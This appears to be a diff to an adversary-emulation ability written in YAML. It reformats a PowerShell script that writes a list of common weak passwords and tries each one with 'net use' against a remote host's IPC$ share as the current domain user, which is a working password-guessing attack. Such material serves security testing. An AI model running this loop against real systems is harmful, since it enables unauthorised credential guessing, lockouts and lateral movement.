@@ -12,11 +12,11 @@
     windows:
       psh:
         command: |
-          echo Password1> passwords.txt;
-          echo 1q2w3e4r>> passwords.txt;
-          echo Password!>> passwords.txt;
-          echo Spring2022>> passwords.txt;
-          echo ChangeMe!>> passwords.txt;
+          echo Password1 > passwords.txt;
+          echo 1q2w3e4r >> passwords.txt;
+          echo Password! >> passwords.txt;
+          echo Spring2022 >> passwords.txt;
+          echo ChangeMe! >> passwords.txt;
           foreach($passw in Get-Content ".\passwords.txt") {
             net use '#{remote.host.fqdn}\IPC$' /user:"$env:USERDNSDOMAIN\$env:USERNAME" "$passw" 1>$null 2>&1;
             if ($?) {
